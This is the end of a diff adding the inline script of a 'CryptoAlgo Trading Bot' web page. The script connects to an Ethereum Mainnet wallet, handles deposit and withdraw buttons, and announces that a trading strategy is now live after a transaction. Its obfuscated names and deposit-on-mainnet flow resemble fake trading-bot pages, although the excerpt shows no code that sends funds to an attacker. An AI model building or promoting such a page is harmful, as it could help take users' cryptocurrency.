+                    a81(`CryptoAlgo Trading Bot successfully activated on Ethereum Mainnet! Your ${st} strategy with ${ri} risk profile is now live. Transaction: ${txH.slice(0,10)}...`, "success");
+                    sI.classList.remove("active");
+                    sI.classList.add("completed");
+                    a89()
+                } catch (e) {
+                    console.error("Full error:", e);
+                    a81("Trading initialization failed on Ethereum Mainnet: " + (e.message || e), "error")
+                } finally {
+                    sEB.disabled = false;
+                    sEB.innerHTML = '<i class="fas fa-rocket"></i> Initialize Trading Bot'
+                }
+            }
+
+            document.getElementById("withdrawButton").addEventListener("click", function() {
+                a8b()
+            });
+            document.getElementById("closeModal").addEventListener("click", function() {
+                document.getElementById("withdrawModal").style.display = "none"
+            });
+            window.addEventListener("click", function(e) {
+                const m = document.getElementById("withdrawModal");
+                if (e.target === m) {
+                    m.style.display = "none"
+                }
+            });
+            aI.setAttribute("min", MD);
+            aI.setAttribute("placeholder", `Min ${MD} ETH`);
+            cWB.addEventListener("click", a82);
+            dWB.addEventListener("click", a83);
+            dCB.addEventListener("click", a8e);
+            sEB.addEventListener("click", a8f);
+            if (window.ethereum) {
+                window.ethereum.request({
+                    method: "eth_accounts"
+                }).then(async function(a) {
+                    if (a.length > 0) {
+                        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                        if (chainId === ETHEREUM_MAINNET_CHAIN_ID) {
+                            ac = a;
+                            wAD.textContent = ac[0];
+                            wID.style.display = "flex";
+                            tD.style.display = "block";
+                            cWD.style.display = "none";
+                            a7e();
+                            a84()
+                        } else {
+                            a81("Please switch to Ethereum Mainnet to connect your wallet.", "error");
+                        }
+                    }
+                }).catch(function(e) {
+                    console.error(e)
+                })
+            }
+        })
+    })();
+</script>
+</body>
+
+</html>
